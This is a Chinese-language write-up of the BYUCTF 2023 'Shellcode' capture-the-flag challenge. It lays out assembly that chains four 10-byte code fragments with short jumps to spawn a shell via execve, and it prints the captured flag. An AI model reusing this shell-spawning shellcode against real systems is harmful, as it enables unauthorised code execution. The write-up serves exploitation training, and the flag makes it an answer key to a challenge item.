# BYUCTF 2023 - Shellcode

## 题目简述

程序在固定地址 `0x777777000` 映射 RWX 内存，并把四段各 10 字节输入分别复制到偏移 `0x00`、`0x20`、`0x40`、`0x60`。需要在不连续的代码岛之间跳转，最终执行 `execve("/bin/sh", NULL, NULL)`。

## 解题过程

每个前三段使用 9 字节有效指令，末尾用两字节短跳转跨过空洞；`jmp short $+0x19` 从当前指令位置跳到下一个代码岛。官方脚本的四段逻辑为：

```asm
; island 1
mov dword ptr [rbp], 0x6e69622f
jmp short $+0x19

; island 2
mov dword ptr [rbp+4], 0x0068732f
jmp short $+0x19

; island 3
mov rdi, rbp
xor esi, esi
xor edx, edx
jmp short $+0x19

; island 4
mov al, 0x3b
syscall
```

前两段在 `rbp` 指向的可写区拼出 `/bin/sh\0`；第三段设置 `rdi`、`rsi`、`rdx`；最后设置系统调用号 `59`。官方 README 把“需要清零”的寄存器误写成 `rdi` 和 `rsi`，源码脚本实际且正确地清零的是 `rsi` 和 `rdx`。

拿到 shell 后读取：

```text
byuctf{1m_als0_pretty_new_t0_pwn_s0_h0p3_it_was_g00d}
```

## 方法总结

受限 shellcode 题首先要把内存布局画成代码岛，再为每段同时预算有效指令和跳板。固定 RWX 地址消除了地址不确定性，真正限制是每岛 10 字节及岛间 `0x20` 间隔。
